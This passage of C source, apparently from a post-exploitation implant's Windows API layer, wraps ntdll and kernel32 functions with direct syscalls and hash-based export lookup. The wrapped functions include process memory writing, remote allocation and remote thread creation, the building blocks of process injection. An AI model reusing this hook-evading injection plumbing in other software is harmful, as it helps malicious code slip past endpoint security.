            return pZwSetInformationWorkerFactory(WorkerFactoryHandle, WorkerFactoryInformationClass, WorkerFactoryInformation, WorkerFactoryInformationLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwSetIoCompletion(HANDLE IoCompletionHandle, PVOID KeyContext, PVOID ApcContext, NTSTATUS IoStatus, ULONG_PTR IoStatusInformation) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)IoCompletionHandle, (ULONG_PTR)KeyContext, (ULONG_PTR)ApcContext, (ULONG_PTR)IoStatus, (ULONG_PTR)IoStatusInformation };
        return SyscallStub(lpWinApiSyscalls[ZwSetIoCompletion], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwSetIoCompletion)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR) = GetFunctionH(NTDLL_DLL, H_ZwSetIoCompletion);
        dprintf("[WINAPI][winapi_ntdll_ZwSetIoCompletion] Calling ZwSetIoCompletion @ %p", pZwSetIoCompletion);
        if (pZwSetIoCompletion) {
            return pZwSetIoCompletion(IoCompletionHandle, KeyContext, ApcContext, IoStatus, IoStatusInformation);
        }
    }
    return 0xC0000001;
}

DEFINE_CACHED_WINAPI_WRAPPER(NTSTATUS, winapi_ntdll_RtlCreateUserThread, NTAPI, NTDLL_DLL, H_RtlCreateUserThread,
    (HANDLE ProcessHandle, PVOID SecurityDescriptor, BOOL CreateSuspended, ULONG StackZeroBits, SIZE_T StackReserve, SIZE_T StackCommit, PVOID StartAddress, PVOID StartParameter, PHANDLE ThreadHandle, PVOID ClientId),
    (ProcessHandle, SecurityDescriptor, CreateSuspended, StackZeroBits, StackReserve, StackCommit, StartAddress, StartParameter, ThreadHandle, ClientId), 0xC0000001)

NTSTATUS winapi_ntdll_ZwMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, ULONG CommitSize, PLARGE_INTEGER SectionOffset, PULONG ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)ZeroBits, (ULONG_PTR)CommitSize, (ULONG_PTR)SectionOffset, (ULONG_PTR)ViewSize, (ULONG_PTR)InheritDisposition, (ULONG_PTR)AllocationType, (ULONG_PTR)Win32Protect };
        return SyscallStub(lpWinApiSyscalls[ZwMapViewOfSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG, ULONG, PLARGE_INTEGER, PULONG, DWORD, ULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwMapViewOfSection);
        dprintf("[WINAPI][winapi_ntdll_ZwMapViewOfSection] Calling ZwMapViewOfSection @ %p", pZwMapViewOfSection);
        if (pZwMapViewOfSection) {
            return pZwMapViewOfSection(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwCreateSection(PHANDLE SectionHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)MaximumSize, (ULONG_PTR)SectionPageProtection, (ULONG_PTR)AllocationAttributes, (ULONG_PTR)FileHandle };
        return SyscallStub(lpWinApiSyscalls[ZwCreateSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE) = GetFunctionH(NTDLL_DLL, H_ZwCreateSection);
        dprintf("[WINAPI][winapi_ntdll_ZwCreateSection] Calling ZwCreateSection @ %p", pZwCreateSection);
        if (pZwCreateSection) {
            return pZwCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes };
        return SyscallStub(lpWinApiSyscalls[ZwOpenSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES) = GetFunctionH(NTDLL_DLL, H_ZwOpenSection);
        dprintf("[WINAPI][winapi_ntdll_ZwOpenSection] Calling ZwOpenSection @ %p", pZwOpenSection);
        if (pZwOpenSection) {
            return pZwOpenSection(SectionHandle, DesiredAccess, ObjectAttributes);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PVOID IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)FileHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)IoStatusBlock, (ULONG_PTR)ShareAccess, (ULONG_PTR)OpenOptions };
        return SyscallStub(lpWinApiSyscalls[ZwOpenFile], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID, ULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwOpenFile);
        dprintf("[WINAPI][winapi_ntdll_ZwOpenFile] Calling ZwOpenFile @ %p", pZwOpenFile);
        if (pZwOpenFile) {
            return pZwOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryAttributesFile(POBJECT_ATTRIBUTES ObjectAttributes, PVOID FileInformation) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ObjectAttributes, (ULONG_PTR)FileInformation };
        return SyscallStub(lpWinApiSyscalls[ZwQueryAttributesFile], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryAttributesFile)(POBJECT_ATTRIBUTES, PVOID) = GetFunctionH(NTDLL_DLL, H_ZwQueryAttributesFile);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryAttributesFile] Calling ZwQueryAttributesFile @ %p", pZwQueryAttributesFile);
        if (pZwQueryAttributesFile) {
            return pZwQueryAttributesFile(ObjectAttributes, FileInformation);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwClose(HANDLE Handle) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)Handle };
        return SyscallStub(lpWinApiSyscalls[ZwClose], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwClose)(HANDLE) = GetFunctionH(NTDLL_DLL, H_ZwClose);
        dprintf("[WINAPI][winapi_ntdll_ZwClose] Calling ZwClose @ %p", pZwClose);
        if (pZwClose) {
            return pZwClose(Handle);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwLockVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG RegionSize, ULONG MapType) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)MapType };
        return SyscallStub(lpWinApiSyscalls[ZwLockVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwLockVirtualMemory)(HANDLE, PVOID*, PULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwLockVirtualMemory);
        dprintf("[WINAPI][winapi_ntdll_ZwLockVirtualMemory] Calling ZwLockVirtualMemory @ %p", pZwLockVirtualMemory);
        if (pZwLockVirtualMemory) {
            return pZwLockVirtualMemory(ProcessHandle, BaseAddress, RegionSize, MapType);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress };
        return SyscallStub(lpWinApiSyscalls[ZwUnmapViewOfSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwUnmapViewOfSection)(HANDLE, PVOID) = GetFunctionH(NTDLL_DLL, H_ZwUnmapViewOfSection);
        dprintf("[WINAPI][winapi_ntdll_ZwUnmapViewOfSection] Calling ZwUnmapViewOfSection @ %p", pZwUnmapViewOfSection);
        if (pZwUnmapViewOfSection) {
            return pZwUnmapViewOfSection(ProcessHandle, BaseAddress);
        }
    }
    return 0xC0000001;
}
// END: ntdll.dll
// START: kernel32.dll

static BOOL winapi_NtStatusSucceeded(NTSTATUS status)
{
    if (status >= STATUS_SUCCESS) {
        return TRUE;
    }

    SetLastError(winapi_ntdll_RtlNtStatusToDosError(status));
    return FALSE;
}

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_WriteProcessMemoryFallback, WINAPI, KERNEL32_DLL, H_WriteProcessMemory,
    (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten),
    (hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten), FALSE)

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_ReadProcessMemoryFallback, WINAPI, KERNEL32_DLL, H_ReadProcessMemory,
    (HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead),
    (hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead), FALSE)

static BOOL winapi_IsWritableProtection(DWORD protection)
{
    if ((protection & PAGE_GUARD) != 0) {
        return FALSE;
    }

    switch (protection & 0xff) {
        case PAGE_READWRITE:
        case PAGE_WRITECOPY:
        case PAGE_EXECUTE_READWRITE:
        case PAGE_EXECUTE_WRITECOPY:
            return TRUE;
        default:
            return FALSE;
    }
}

static BOOL winapi_kernel32_WriteProcessMemoryRequiresFallback(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T nSize)
{
    ULONG_PTR currentAddress = (ULONG_PTR)lpBaseAddress;
    ULONG_PTR maximumAddress = (ULONG_PTR)-1;
    ULONG_PTR endAddress;

    if (nSize == 0) {
        return FALSE;
    }
    if (nSize > (SIZE_T)(maximumAddress - currentAddress)) {
        return TRUE;
    }
    endAddress = currentAddress + nSize;

    while (currentAddress < endAddress) {
        MEMORY_BASIC_INFORMATION memory = {0};
        SIZE_T returnLength = 0;
        ULONG_PTR regionBase;
        ULONG_PTR nextAddress;
        NTSTATUS status = winapi_ntdll_ZwQueryVirtualMemory(
            hProcess,
            (PVOID)currentAddress,
            MemoryBasicInformation,
            &memory,
            sizeof(memory),
            &returnLength);

        if (status < STATUS_SUCCESS || returnLength == 0 || memory.RegionSize == 0) {
            return TRUE;
        }
        if (memory.State == MEM_COMMIT && !winapi_IsWritableProtection(memory.Protect)) {
            return TRUE;
        }

        regionBase = (ULONG_PTR)memory.BaseAddress;
        if (memory.RegionSize > (SIZE_T)(maximumAddress - regionBase)) {
            return TRUE;
        }
        nextAddress = regionBase + memory.RegionSize;
        if (nextAddress <= currentAddress) {
            return TRUE;
        }
        currentAddress = nextAddress;
    }

    return FALSE;
}

BOOL winapi_kernel32_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    if (hasDirectSyscallSupport()) {
        // Kernel32 temporarily changes committed non-writable pages while
        // servicing debugger-style writes. Keep that compatibility behavior
        // in the private export fallback; ordinary writable ranges stay on
        // the direct ZwWriteVirtualMemory path.
        if (winapi_kernel32_WriteProcessMemoryRequiresFallback(hProcess, lpBaseAddress, nSize)) {
            return winapi_kernel32_WriteProcessMemoryFallback(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
        }

        NTSTATUS dwStatus = winapi_ntdll_ZwWriteVirtualMemory(hProcess, lpBaseAddress, (LPVOID)lpBuffer, nSize, lpNumberOfBytesWritten);
        dprintf("[WINAPI][winapi_kernel32_WriteProcessMemory] Syscall ZwWriteVirtualMemory returned: %d", dwStatus);
        if (!winapi_NtStatusSucceeded(dwStatus)) {
            return FALSE;
        }

        // Match WriteProcessMemory's cache-coherency behavior. The flush result
        // does not change whether the bytes were written successfully.
        winapi_kernel32_FlushInstructionCache(hProcess, lpBaseAddress, nSize);
        return TRUE;
    }

    return winapi_kernel32_WriteProcessMemoryFallback(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

BOOL winapi_kernel32_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwReadVirtualMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
        dprintf("[WINAPI][winapi_kernel32_ReadProcessMemory] Syscall ZwReadVirtualMemory returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_ReadProcessMemoryFallback(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
}

static DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_OpenProcessFallback, WINAPI, KERNEL32_DLL, H_OpenProcess,
    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId),
    (dwDesiredAccess, bInheritHandle, dwProcessId), NULL)

HANDLE winapi_kernel32_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (hasDirectSyscallSupport()) {
        OBJECT_ATTRIBUTES objAttributes = {0};
        objAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        objAttributes.Attributes = bInheritHandle ? OBJ_INHERIT : 0;
        CLIENT_ID clientId = {0};
        HANDLE hProcess = NULL;
        clientId.UniqueProcess = (HANDLE)((ULONG_PTR)dwProcessId);
        NTSTATUS dwStatus = winapi_ntdll_ZwOpenProcess(&hProcess, dwDesiredAccess, &objAttributes, &clientId);
        dprintf("[WINAPI][winapi_kernel32_OpenProcess] Syscall ZwOpenProcess returned: %d", dwStatus);
        if (winapi_NtStatusSucceeded(dwStatus)) {
            return hProcess;
        }
        return NULL;
    }

    return winapi_kernel32_OpenProcessFallback(dwDesiredAccess, bInheritHandle, dwProcessId);
}

static DEFINE_CACHED_WINAPI_WRAPPER(LPVOID, winapi_kernel32_VirtualAllocFallback, WINAPI, KERNEL32_DLL, H_VirtualAlloc,
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect),
    (lpAddress, dwSize, flAllocationType, flProtect), NULL)

static DEFINE_CACHED_WINAPI_WRAPPER(LPVOID, winapi_kernel32_VirtualAllocExFallback, WINAPI, KERNEL32_DLL, H_VirtualAllocEx,
    (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect),
    (hProcess, lpAddress, dwSize, flAllocationType, flProtect), NULL)

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualProtectFallback, WINAPI, KERNEL32_DLL, H_VirtualProtect,
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect),
    (lpAddress, dwSize, flNewProtect, lpflOldProtect), FALSE)

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualProtectExFallback, WINAPI, KERNEL32_DLL, H_VirtualProtectEx,
    (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect),
    (hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect), FALSE)

static DEFINE_CACHED_WINAPI_WRAPPER(SIZE_T, winapi_kernel32_VirtualQueryFallback, WINAPI, KERNEL32_DLL, H_VirtualQuery,
    (LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength),
    (lpAddress, lpBuffer, dwLength), 0)

static DEFINE_CACHED_WINAPI_WRAPPER(SIZE_T, winapi_kernel32_VirtualQueryExFallback, WINAPI, KERNEL32_DLL, H_VirtualQueryEx,
    (HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength),
    (hProcess, lpAddress, lpBuffer, dwLength), 0)

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualFreeFallback, WINAPI, KERNEL32_DLL, H_VirtualFree,
    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType),
    (lpAddress, dwSize, dwFreeType), FALSE)

static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_VirtualFreeExFallback, WINAPI, KERNEL32_DLL, H_VirtualFreeEx,
    (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType),
    (hProcess, lpAddress, dwSize, dwFreeType), FALSE)

LPVOID winapi_kernel32_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(GetCurrentProcess(), &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAlloc] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (winapi_NtStatusSucceeded(dwStatus)) {
            return lpBaseAddr;
        }
        return NULL;
    }

    return winapi_kernel32_VirtualAllocFallback(lpAddress, dwSize, flAllocationType, flProtect);
}

LPVOID winapi_kernel32_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(hProcess, &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAllocEx] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (winapi_NtStatusSucceeded(dwStatus)) {
            return lpBaseAddr;
        }
        return NULL;
    }

    return winapi_kernel32_VirtualAllocExFallback(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL winapi_kernel32_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddr, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtect] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_VirtualProtectFallback(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

BOOL winapi_kernel32_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(hProcess, &lpBaseAddr, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtectEx] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_VirtualProtectExFallback(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

SIZE_T winapi_kernel32_VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(GetCurrentProcess(), (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQuery] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (winapi_NtStatusSucceeded(dwStatus)) {
            return returnLength;
        }
        return 0;
    }

    return winapi_kernel32_VirtualQueryFallback(lpAddress, lpBuffer, dwLength);
}

SIZE_T winapi_kernel32_VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(hProcess, (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQueryEx] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (winapi_NtStatusSucceeded(dwStatus)) {
            return returnLength;
        }
        return 0;
    }

    return winapi_kernel32_VirtualQueryExFallback(hProcess, lpAddress, lpBuffer, dwLength);
}

BOOL winapi_kernel32_VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwFreeVirtualMemory(GetCurrentProcess(), &lpBaseAddr, &dwDataSize, dwFreeType);
        dprintf("[WINAPI][winapi_kernel32_VirtualFree] Syscall ZwFreeVirtualMemory returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_VirtualFreeFallback(lpAddress, dwSize, dwFreeType);
}

BOOL winapi_kernel32_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwFreeVirtualMemory(hProcess, &lpBaseAddr, &dwDataSize, dwFreeType);
        dprintf("[WINAPI][winapi_kernel32_VirtualFreeEx] Syscall ZwFreeVirtualMemory returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_VirtualFreeExFallback(hProcess, lpAddress, dwSize, dwFreeType);
}

DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateRemoteThread, WINAPI, KERNEL32_DLL, H_CreateRemoteThread,
    (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId),
    (hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_CloseHandle, WINAPI, KERNEL32_DLL, H_CloseHandle,
    (HANDLE hObject), (hObject), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_DuplicateHandle, WINAPI, KERNEL32_DLL, H_DuplicateHandle,
    (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions),
    (hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateToolhelp32Snapshot, WINAPI, KERNEL32_DLL, H_CreateToolhelp32Snapshot,
    (DWORD dwFlags, DWORD th32ProcessID), (dwFlags, th32ProcessID), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_Thread32First, WINAPI, KERNEL32_DLL, H_Thread32First,
    (HANDLE hSnapshot, LPTHREADENTRY32 lpte), (hSnapshot, lpte), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_OpenThread, WINAPI, KERNEL32_DLL, H_OpenThread,
    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId), (dwDesiredAccess, bInheritHandle, dwThreadId), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_SuspendThread, WINAPI, KERNEL32_DLL, H_SuspendThread,
    (HANDLE hThread), (hThread), (DWORD)-1)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_Thread32Next, WINAPI, KERNEL32_DLL, H_Thread32Next,
    (HANDLE hSnapshot, LPTHREADENTRY32 lpte), (hSnapshot, lpte), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_ResumeThread, WINAPI, KERNEL32_DLL, H_ResumeThread,
    (HANDLE hThread), (hThread), (DWORD)-1)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_FreeLibrary, WINAPI, KERNEL32_DLL, H_FreeLibrary,
    (HMODULE hLibModule), (hLibModule), FALSE)
static DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_FlushInstructionCacheFallback, WINAPI, KERNEL32_DLL, H_FlushInstructionCache,
    (HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize), (hProcess, lpBaseAddress, dwSize), FALSE)

BOOL winapi_kernel32_FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwFlushInstructionCache(hProcess, lpBaseAddress, dwSize);
        dprintf("[WINAPI][winapi_kernel32_FlushInstructionCache] Syscall ZwFlushInstructionCache returned: %d", dwStatus);
        return winapi_NtStatusSucceeded(dwStatus);
    }

    return winapi_kernel32_FlushInstructionCacheFallback(hProcess, lpBaseAddress, dwSize);
}

DEFINE_CACHED_WINAPI_WRAPPER(HLOCAL, winapi_kernel32_LocalFree, WINAPI, KERNEL32_DLL, H_LocalFree,
    (HLOCAL hMem), (hMem), hMem)

DEFINE_CACHED_WINAPI_WRAPPER(HANDLE, winapi_kernel32_CreateFileA, WINAPI, KERNEL32_DLL, H_CreateFileA,
    (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile),
    (lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile), INVALID_HANDLE_VALUE)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_WriteFile, WINAPI, KERNEL32_DLL, H_WriteFile,
    (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped),
    (hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped), FALSE)
DEFINE_CACHED_WINAPI_WRAPPER(HMODULE, winapi_kernel32_LoadLibraryA, WINAPI, KERNEL32_DLL, H_LoadLibraryA,
    (LPCSTR lpLibFileName), (lpLibFileName), NULL)
DEFINE_CACHED_WINAPI_WRAPPER(DWORD, winapi_kernel32_WaitForMultipleObjects, WINAPI, KERNEL32_DLL, H_WaitForMultipleObjects,
    (DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds),
    (nCount, lpHandles, bWaitAll, dwMilliseconds), WAIT_FAILED)
DEFINE_CACHED_WINAPI_WRAPPER(BOOL, winapi_kernel32_SetHandleInformation, WINAPI, KERNEL32_DLL, H_SetHandleInformation,
    (HANDLE hObject, DWORD dwMask, DWORD dwFlags), (hObject, dwMask, dwFlags), FALSE)
